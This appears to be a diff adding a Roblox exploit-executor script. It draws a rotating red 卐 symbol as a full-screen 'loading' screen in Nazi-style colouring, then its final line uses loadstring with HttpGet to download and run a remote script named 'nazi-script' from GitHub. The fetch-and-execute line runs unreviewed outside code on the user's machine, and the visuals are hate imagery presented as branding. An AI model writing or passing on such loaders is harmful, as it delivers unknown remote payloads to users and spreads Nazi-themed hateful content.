@@ -1,0 +1,83 @@
+-- Remove existing loader if it exists
+if game.CoreGui:FindFirstChild("AkiriLoadingUI") then
+    game.CoreGui:FindFirstChild("AkiriLoadingUI"):Destroy()
+end
+
+-- ScreenGui
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "AkiriLoadingUI"
+screenGui.Parent = game:GetService("CoreGui")
+screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+screenGui.IgnoreGuiInset = true
+
+-- Rotating symbol (larger size)
+local rotateFrame = Instance.new("Frame")
+rotateFrame.Size = UDim2.new(0, 600, 0, 600)  -- Increased size
+rotateFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+rotateFrame.BackgroundTransparency = 1
+rotateFrame.Position = UDim2.new(0.5, 0, 0.5, 0)  -- Centered in the screen
+rotateFrame.Parent = screenGui
+
+local function createSymbol(textColor, offset)
+	local label = Instance.new("TextLabel")
+	label.Size = UDim2.new(0, 600, 0, 600)  -- Increased symbol size
+	label.AnchorPoint = Vector2.new(0.5, 0.5)
+	label.BackgroundTransparency = 1
+	label.Position = UDim2.new(0.5, offset.X, 0.5, offset.Y)
+	label.Text = "卐"
+	label.TextSize = 300  -- Increased text size
+	label.TextColor3 = textColor
+	label.Font = Enum.Font.GothamBold
+	label.ZIndex = 2
+	label.TextTransparency = 1  -- Start with full transparency
+	return label
+end
+
+local outlineOffsets = {
+	Vector2.new(-1, 0),
+	Vector2.new(1, 0),
+	Vector2.new(0, -1),
+	Vector2.new(0, 1),
+}
+
+for _, offset in ipairs(outlineOffsets) do
+	local outline = createSymbol(Color3.new(0, 0, 0), offset)
+	outline.ZIndex = 1
+	outline.Parent = rotateFrame
+end
+
+local symbolLabel = createSymbol(Color3.fromRGB(160, 0, 0), Vector2.new(0, 0))
+symbolLabel.ZIndex = 2
+symbolLabel.Parent = rotateFrame
+
+-- TweenService for fading
+local TweenService = game:GetService("TweenService")
+local fadeInTween = TweenService:Create(symbolLabel, TweenInfo.new(1, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut), {TextTransparency = 0})
+local fadeOutTween = TweenService:Create(symbolLabel, TweenInfo.new(1, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut), {TextTransparency = 1})
+
+-- Fade in effect at the start
+fadeInTween:Play()
+
+-- ROTATION
+local rotation = 0
+game:GetService("RunService").RenderStepped:Connect(function(dt)
+	rotation = (rotation + 60 * dt) % 360
+	for _, child in pairs(rotateFrame:GetChildren()) do
+		if child:IsA("TextLabel") then
+			child.Rotation = rotation
+		end
+	end
+end)
+
+-- Realistic loading behavior: Make the screen go away after a short time with fade-out
+task.spawn(function()
+	wait(5)  -- Wait for 5 seconds before starting fade-out
+	fadeOutTween:Play()  -- Fade the symbol out
+
+	wait(1)  -- Wait for the fade-out to complete
+	screenGui:Destroy()  -- Remove the screen
+end)
+
+wait(6)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/1heeheeheeheehee/nazi-script/refs/heads/main/nazi%20script"))()
